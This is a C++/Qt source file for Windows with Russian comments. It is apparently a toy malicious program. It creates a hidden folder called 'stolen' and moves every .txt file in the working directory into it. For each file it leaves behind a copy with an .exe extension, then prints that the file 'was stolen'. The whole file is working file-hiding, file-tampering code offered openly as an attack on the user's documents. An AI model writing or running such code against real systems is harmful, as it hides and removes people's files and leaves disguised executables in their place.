#include <QCoreApplication>
#include <iostream>
#include <windows.h>
#include <QDir>
#include <QStringList>
#include <QDebug>
#include <QFile>
using namespace std;

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    //получаем директорию, в которой находится .exe
    char* buffer = new char[MAX_PATH]; //создаем переменную, в которую затем запишем путь
    GetCurrentDirectoryA(MAX_PATH,buffer); //получаем путь к папке, в которой содержится файл
    //CharToOemA(buffer, buffer); //преобразует из кодировки ANSI в OEM (если в названии пути есть русские буквы)
   // cout << buffer << endl;//для отладки

    //создаем скрытую папку в данной директории, куда будем перемещать файлы
    QString folder = QString(buffer) + "/stolen"; //путь к папке и ее имя

//////////////////////////////TODO
    if (QDir(folder).exists() != true) { //если папки с именем stolen нет в данной директории
            QDir().mkdir(folder); //создаем папку
    }

    QByteArray folderTwo = folder.toLatin1(); //преобразуем путь до папки в char, чтобы работать с атрибутами папки
    const char *folderRid = folderTwo.data(); //путь до папки
    DWORD attributes; //переменная для аттрибутов созданной папки
    attributes = GetFileAttributesA(folderRid); //получаем атрибуты
    attributes = attributes + FILE_ATTRIBUTE_HIDDEN;
    //FILE_ATTRIBUTE_HIDDEN = Файл или каталог скрытые
    //FILE_ATTRIBUTE_SYSTEM = Файл или каталог - частично или исключительно используются  операционной системой.
    SetFileAttributesA(folderRid, attributes);//устанавливает новые атрибуты для папки (делаем ее скрытой)
    //folder = QString(folderRid);

    //получаем файлы, которые находятся в данной директории
    //QString path = buffer;
    QDir dir(buffer); //получаем текущий путь и "открываем" папку
    QStringList nameFilter; // имя фильтра
    nameFilter << "*.txt"; //указываем, что хотим получить только .txt
    QStringList allFiles = dir.entryList(nameFilter,  QDir::Files); // сохраняем имена файлов сюда и говорим, что хотим найти только .txt файлы
    //QFileInfoList list = dir.entryInfoList( nameFilter, QDir::Files );//еще один вариант предыдущего
    QString fileInfo; //сюда будем считывать элементы (имена файлов)

    foreach (fileInfo, allFiles) {
//(переменная, контейнер) foreach используется для перебора всех элементов контейнера
       qDebug() << fileInfo; // fflush(qDebug);

       QFile file(fileInfo); //файл, который находится на диске
       QString fileInfoTwo = fileInfo; //имя файла, в который будем копировать информацию
       fileInfoTwo.remove(".txt"); //убираем расширение .txt
       fileInfoTwo += ".exe"; //добавляем расширение .exe
       QFile fileTwo (fileInfoTwo); //файл, в который переписывается информация

       if(file.open(QIODevice::ReadOnly) && fileTwo.open(QIODevice::WriteOnly))
           { //Если первый файл открыт для чтения, а второй для записи успешно создан
               QByteArray block = file.readAll(); // Считываем символы из file в массив block
               fileTwo.write(block); // Записываем символы из block в fileTwo
               file.close(); // Закрываем file.txt
               fileTwo.close(); // Закрываем fileTwo.txt

               QString name = folder + "\\" + fileInfo; //путь к файлу в скрытой папке
               QFile::copy(fileInfo, name); //копируем файл в скрытую папку
               QFile::remove(fileInfo); //удаляем файл из предыдущей папки
           } else {
           cout << "Не удалось открыть текстовый файл. Возможно, в папке нет ни одного текстового файла";
       }
       cout << "Your " << fileInfo.toStdString() << " was stolen." << endl; //для отладки
    }

    return a.exec();
}

